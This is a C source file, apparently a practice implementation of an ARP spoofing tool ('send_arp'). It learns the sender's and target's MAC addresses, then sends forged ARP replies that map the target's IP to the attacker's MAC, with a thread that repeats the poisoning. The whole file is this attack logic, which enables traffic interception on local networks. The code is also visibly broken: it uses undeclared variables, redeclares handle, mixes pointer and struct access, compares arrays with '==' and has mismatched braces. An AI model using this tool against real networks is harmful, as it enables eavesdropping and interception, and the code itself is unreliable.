#include "send_arp.h"

void usage() {
	// many sedner and target
	printf("Should have syntax: send_arp <interface> <send ip1> <target ip1> ... \n");
}

void print_ether(uint8_t *ether) {
	printf("MAC address : ");
	for (int i = 0; i < 5; i++) {
		printf("%02x:", ether[i]);
	}
	printf("%02x\n", ether[5]);
}

void print_ip(uint8_t *ip) {
	printf("IP address : ");
	for (int i = 0; i < 3; i++) {
		printf("%d.", ip[i]);
	}
	printf("%d\n", ip[3]);
}

void get_dev_ether_addr(uint8_t *ether, char *dev) {
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	if(s < 0) perror("socket fail");
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0) perror("ioctl fail");
	memcpy(ether, ifr.ifr_hwaddr.sa_data, 6);
	close(s);
}

void get_dev_ip_addr(uint8_t *ip, char *dev) {
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	if(s < 0) perror("socket fail");
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	if(ioctl(s, SIOCGIFADDR, &ifr) < 0) perror("ioctl fail");
	memcpy(ip, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4 * sizeof(*ip));
	close(s);
}

void rq_arp(struct rq_packet* p) {
	p->eth_header.ether_type = htons(ETHERTYPE_ARP);
	p->arp_p.arp_hw = htons(1);
	p->arp_p.arp_pro = htons(ETHERTYPE_IP);
	p->arp_p.arp_hlen = (uint8_t)6;
	p->arp_p.arp_plen = (uint8_t)4;
	p->arp_p.arp_op = (uint16_t)1; //request
}

void print_arp(struct rq_packet* rq_p) {
		printf("---------------ethernet protocol--------------------\n");
		print_ether(rq_p->eth_header.ether_dhost);
		print_ether(rq_p->eth_header.ether_shost);
		printf("ether type : 0x%04x\n", htons(rq_p->eth_header.ether_type));

		printf("---------------arp protocol--------------------\n");
		printf("Hardware type : 0x%04x\n", htons(rq_p->arp_p.arp_hw));
		printf("Protocol type : 0x0%x\n", htons(rq_p->arp_p.arp_pro));
		printf("Hardware size : %d\n", rq_p->arp_p.arp_hlen);
		printf("Protocol size : %d\n", rq_p->arp_p.arp_plen);
		printf("Opcode : %d\n", rq_p->arp_p.arp_op);
		printf("Source ");
		print_ether(rq_p->arp_p.source_ether_addr);
		printf("Destination ");
		print_ether(rq_p->arp_p.dest_ether_addr);
		printf("Source ip ");
		print_ip(rq_p->arp_p.source_ip_addr);
		printf("Destination ip ");
		print_ip(rq_p->arp_p.dest_ip_addr);
}

void send_recv_arp(pcap_t *handle, struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *my_ip, uint8_t *my_ether) {

	memcpy(rq_p->arp_p.dest_ip_addr, sp_list->sender_ip_addr, 4);
	memcpy(rq_p->arp_p.source_ip_addr, my_ip, 4);
	memcpy(rq_p->eth_header.ether_shost, my_ether, 6);
	memcpy(rq_p->eth_header.ether_dhost, broadcast_ether, 6);
	memcpy(rq_p->arp_p.source_ether_addr, my_ether, 6);
	memcpy(rq_p->arp_p.dest_ether_addr, broadcast_ether, 6);
	rq_arp(&rq_p); // make the rest of request packet
	//print request packet

	// send packet
	pcap_t* handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
	if(handle == NULL)  perror("handle null");

	int tmp;
	struct libnet_ethernet_hdr *tmp_eth;
	const uint8_t *get_packet;
	struct pcap_pkthdr *header;
	struct ARP_Header *tmp_arp;


	int timeout = 10;
	while(timeout != 0) {
		pcap_sendpacket(handle, (uint8_t*)&rq_p, sizeof(struct rq_packet));

		//2. recv ARP reply
		while(1) {
			tmp = pcap_next_ex(handle, &header, &get_packet);
			if(tmp<1) continue;
			tmp_eth = (struct libnet_ethernet_hdr *)get_packet;
			if(ntohs(tmp_eth->ether_type) != ETHERTYPE_ARP) continue;
			tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
			if(ntohs(tmp_arp->arp_hw) == 0x0001 && ntohs(tmp_arp->arp_op) == 0x2) {
				if(tmp_arp->source_ip_addr == rq_p.arp_p.dest_ip_addr) {
					memcpy(rq_p->eth_header.ether_dhost, tmp_arp->source_ether_addr, 6);
					break;
				else if(timeout == 0) {
					perror("Timeout ARP request Fail\n");
				}
				else timeout--;
				}
			}
		}
	}
}

void send_recv_target_arp(pcap_t *handle, struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *my_ip, uint8_t *my_ether) {
	memcpy(rq_p->arp_p.dest_ip_addr, sp_list->target_ip_addr, 4);
	memcpy(rq_p->arp_p.source_ip_addr, my_ip, 4);
	memcpy(rq_p->eth_header.ether_shost, my_ether, 6);
	memcpy(rq_p->eth_header.ether_dhost, broadcast_ether, 6);
	memcpy(rq_p->arp_p.source_ether_addr, my_ether, 6);
	memcpy(rq_p->arp_p.dest_ether_addr, broadcast_ether, 6);
	rq_arp(&rq_p); // make the rest of request packet
	//print request packet

	// send packet
	pcap_t* handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
	if(handle == NULL)  perror("handle null");

	int tmp;
	struct libnet_ethernet_hdr *tmp_eth;
	const uint8_t *get_packet;
	struct pcap_pkthdr *header;
	struct ARP_Header *tmp_arp;

	int timeout = 10;
	while(timeout != 0) {
		pcap_sendpacket(handle, (uint8_t*)&rq_p, sizeof(struct rq_packet));
		while(1) {
			tmp = pcap_next_ex(handle, &header, &get_packet);
			if(tmp<1) continue;
			tmp_eth = (struct libnet_ethernet_hdr *)get_packet;
			if(ntohs(tmp_eth->ether_type) != ETHERTYPE_ARP) continue;
			tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
			if(ntohs(tmp_arp->arp_hw) == 0x0001 && ntohs(tmp_arp->arp_op) == 0x2) {
				if(tmp_arp->source_ip_addr == rq_p.arp_p.dest_ip_addr) {
					memcpy(rq_p->eth_header.ether_dhost, tmp_arp->source_ether_addr, 6);
					break;
				}
				else if(timeout == 0) {
					perror("Timeout ARP request Fail\n");
				}
				else timeout--;
			}
		}
	}

}

void send_arp_rply(pcap_t *handle, struct spoof_list *sp_list, uint8_t *my_ether) {
	
	struct rq_packet rp_p; //reply packet

	memcpy(rp_p->eth_header.ether_shost, my_ether, 6);
	memcpy(rp_p->eth_header.ether_dhost, sp_list->sender_ether_addr, 6);

	memcpy(rp_p->arp_p.source_ip_addr, sp_list->target_ip_addr, 4);
	memcpy(rp_p->arp_p.dest_ip_addr, sp_list->sender_ip_addr, 4);

	memcpy(rp_p->arp_p.source_ether_addr, my_ether, 6);
	memcpy(rp_p->arp_p.dest_ether_addr, sp_list->sender_ether_addr, 6);
	rp_p->arp_p.arp_op = htons(2); //reply

	rp_p->eth_header.ether_type = htons(ETHERTYPE_ARP);
	rp_p->arp_p.arp_hw = htons(1);
	rp_p->arp_p.arp_pro = htons(ETHERTYPE_IP);
	rp_p->arp_p.arp_hlen = (uint8_t)6;
	rp_p->arp_p.arp_plen = (uint8_t)4;

	pcap_sendpacket(handle, (uint8_t *)&rp_p, sizeof(rp_p));

}

void *thread_reply(void *arg){
	struct thread_spoof_arg *th_p = (thread_spoof_arg *)arg;
	send_arp_rply(th_p->handle, th_p->list, th_p->my_ether);
    sleep(infect_time);
}